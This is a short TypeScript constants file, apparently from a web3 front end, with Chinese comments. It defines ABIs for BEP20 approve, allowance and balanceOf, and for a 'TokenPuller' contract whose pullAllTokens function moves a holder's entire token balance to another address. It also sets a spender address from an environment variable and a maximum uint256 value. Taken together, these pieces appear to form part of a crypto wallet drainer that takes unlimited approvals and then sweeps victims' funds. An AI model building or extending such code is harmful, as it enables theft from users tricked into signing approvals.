// BEP20 标准 ERC20 ABI（包含 approve、allowance 和 balanceOf 方法）
export const BEP20_ABI = [
  {
    constant: false,
    inputs: [
      {
        name: 'spender',
        type: 'address'
      },
      {
        name: 'amount',
        type: 'uint256'
      }
    ],
    name: 'approve',
    outputs: [
      {
        name: '',
        type: 'bool'
      }
    ],
    payable: false,
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      {
        name: 'owner',
        type: 'address'
      },
      {
        name: 'spender',
        type: 'address'
      }
    ],
    name: 'allowance',
    outputs: [
      {
        name: '',
        type: 'uint256'
      }
    ],
    payable: false,
    stateMutability: 'view',
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      {
        name: 'account',
        type: 'address'
      }
    ],
    name: 'balanceOf',
    outputs: [
      {
        name: '',
        type: 'uint256'
      }
    ],
    payable: false,
    stateMutability: 'view',
    type: 'function'
  }
] as const

// TokenPuller 合约 ABI
export const TOKEN_PULLER_ABI = [
  {
    inputs: [
      {
        internalType: 'contract IERC20',
        name: 'token',
        type: 'address'
      },
      {
        internalType: 'address',
        name: 'from',
        type: 'address'
      },
      {
        internalType: 'address',
        name: 'to',
        type: 'address'
      }
    ],
    name: 'pullAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  }
] as const

// TokenPuller 合约地址（从环境变量获取）
export const TOKEN_PULLER_ADDRESS = process.env.NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`

// Spender 地址（兼容之前的代码）
export const SPENDER_ADDRESS = process.env.NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`

// 最大 uint256 值
export const MAX_UINT256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
